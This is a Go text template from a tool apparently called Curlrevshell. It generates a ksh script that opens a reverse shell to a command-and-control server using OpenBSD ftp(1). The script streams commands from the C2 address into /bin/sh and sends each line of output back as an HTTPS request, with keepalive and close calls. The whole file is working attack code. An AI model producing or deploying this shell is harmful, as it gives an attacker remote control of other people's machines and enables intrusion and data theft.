{{- /*
     * crs.tmpl
     * Curlrevshell -template template.
     * By J. Stuart McMurray
     * Created 20260111
     * Last Modified 20260205
     */ -}}

{{/* ftp is a subtemplate with the common ftp(1) args used for everything. */}}
{{- define "ftp" -}}
ftp -M -o- -S cafile=m4_cafile -V -w 15
{{- end -}}

{{/* curl is a subsubtemplate which makes our ftp(1) calls consistent. 
     We retain the name "curl" not not have to redefine other templates. */}}
{{- define "curl" -}}
{{template "ftp"}} https://{{.C2Addr}}
{{- end -}}

{{/* script hooks up a shell to two ftp(1)s. */}}
{{- define "script" -}}
#!/bin/ksh
set -euo pipefail
KAINT=5 # KeepAlive interval

{{/* Input stream */ -}}
(
	cat <<'_eof'
cat <<'_eof2'
 ___________________
< In the installer! >
 -------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
_eof2
_eof
	exec {{template "curl" .}}/{{.URLPaths.In }}/{{.ID}} </dev/null
) |&
INPID=$!

{{/* Shell with numbered output lines. */ -}}
/bin/sh <&p 2>&1 | cat -n -u |
{{/* Output stream to ftp(1) adapter. */ -}}
(
	while read -r; do
		echo "$REPLY"
		if ! {{template "ftp"}} \
			"https://m4_oqa_cbaddr/line/{{.ID}}?$REPLY"; then
			break
		fi
	done 
	kill $INPID
) &

{{- /* Output stream keepalives. */}}
sleep $KAINT
while [[ -n "$(jobs -l)" ]]; do
	{{template "ftp"}} "https://m4_oqa_cbaddr/keepalive/{{.ID}}"
	sleep $KAINT
done
{{- /* Explicitly close the output stream when we're done. */}}
{{template "ftp"}} "https://m4_oqa_cbaddr/close/{{.ID}}"
{{  end -}}

{{/* vim: set filetype=gotexttmpl noexpandtab smartindent: */ -}}
